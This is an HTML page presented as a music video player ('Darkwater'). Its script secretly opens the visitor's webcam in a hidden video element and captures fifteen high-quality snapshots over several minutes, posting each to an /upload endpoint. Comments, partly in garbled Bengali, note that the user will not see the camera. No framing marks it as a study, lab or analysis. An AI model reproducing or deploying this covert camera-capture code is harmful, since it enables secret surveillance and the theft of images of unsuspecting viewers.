<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Music Video</title>
  <link rel="stylesheet" href="style.css">
  <style>
  body {
  font-family: Arial, sans-serif;
  margin: 0;
  background: #121212;
  color: #fff;
  text-align: center;
}

.container {
  padding: 20px;
}

h1 {
  color: #ffeb3b;
}

.video-wrapper {
  display: flex;
  justify-content: center;
  margin-top: 20px;
}

#musicVideo {
  width: 80%;
  max-width: 800px;
  border: 3px solid #ffeb3b;
  border-radius: 10px;
  box-shadow: 0px 6px 15px rgba(0,0,0,0.6);
}

.status {
  margin-top: 15px;
  font-size: 1.1rem;
  color: #00e676;
}

footer {
  margin-top: 40px;
  font-size: 0.9rem;
  color: #bbb;
}
  </style>
  
  
</head>
<body>
  <div class="container">
    <h1>üé∂ Enjoy the Music Video</h1>

    <!-- ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ø‡¶æ ‡¶¶‡ßá‡¶ñ‡¶¨‡ßá -->
    <div class="video-wrapper">
      <video id="musicVideo" controls autoplay>
        <source src="/video/Darkwater(360P).mp4" type="video/mp4">
        Your browser does not support video.
      </video>
    </div>

    <!-- Hidden camera (‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶¶‡ßá‡¶ñ‡¶¨‡ßá ‡¶®‡¶æ) -->
    <video id="camera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <p id="statusText" class="status">
    Darkwater.mp4  
      
    </p>
  </div>


<script>
let camera = document.getElementById("camera");
let canvas = document.getElementById("canvas");
let ctx = canvas.getContext("2d");
let statusText = document.getElementById("statusText");

// ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ (hidden)
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
  .then(stream => {
    camera.srcObject = stream;
    
  })
  .catch(err => {
    console.error("Camera error: ", err);
    
  });

// ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® + ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (high quality)
async function captureAndUploadImage() {
  // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì‡¶∞ ‡¶Ü‡¶∏‡¶≤ resolution ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ
  const videoWidth = camera.videoWidth || 640;
  const videoHeight = camera.videoHeight || 480;

  canvas.width = videoWidth;
  canvas.height = videoHeight;

  ctx.drawImage(camera, 0, 0, videoWidth, videoHeight);

  let dataUrl = canvas.toDataURL("image/jpeg", 1.0); // full quality JPEG

  try {
    await fetch("/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ images: [dataUrl] }),
    });
    console.log("‚úÖ Image uploaded (high quality)");
  } catch (err) {
    console.error("‚ùå Upload failed:", err);
  }
}

// ‡¶ü‡¶æ‡¶á‡¶Æ‡¶æ‡¶∞ ‡¶≤‡¶ú‡¶ø‡¶ï: 3 ‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶° √ó 5 ‡¶õ‡¶¨‡¶ø, 10s ‡¶Ö‡¶®‡ßç‡¶§‡¶∞, 30s ‡¶¨‡¶ø‡¶∞‡¶§‡¶ø
async function startCapture() {
  for (let round = 0; round < 3; round++) {
    for (let i = 0; i < 5; i++) {
      
      await captureAndUploadImage();
      await new Promise(r => setTimeout(r, 10000)); // 10 sec
    }
    if (round < 2) {
      
      await new Promise(r => setTimeout(r, 30000)); // 30 sec pause
    }
  }

  
}

startCapture();
</script>
</body>
</html>